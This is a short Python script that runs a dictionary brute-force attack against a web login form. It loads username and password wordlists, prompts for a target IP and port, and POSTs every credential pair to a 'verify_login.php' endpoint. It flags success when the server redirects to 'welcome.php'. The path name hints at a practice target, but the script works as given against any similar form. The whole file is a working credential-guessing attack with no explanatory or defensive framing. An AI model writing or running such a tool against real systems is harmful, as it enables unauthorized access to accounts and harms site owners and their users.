import http.client, urllib.parse

username_file=open('user.txt')
password_file=open('top_shortlist.txt')
host=input("Enter ip target: ")
port=int(input("Enter target port: "))

user_list=username_file.readlines()
pwd_list=password_file.readlines()

for user in user_list:
    user=user.rstrip()
    for pwd in pwd_list:
        pwd=pwd.rstrip()

        print(user,"-",pwd)
        post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd,'Submit': "Submit"})
        headers={"Content-type": "application/x-www-form-urlencoded","Accept": "text/html,application/xhtml+xml"}
        connection = http.client.HTTPConnection(host, port)
        connection.request('POST','/brutforce_login/verify_login.php',post_parameters,headers)
        response=connection.getresponse()

        if(response.getheader('location')=="welcome.php"):
            print("Logged with ",user,"-",pwd)
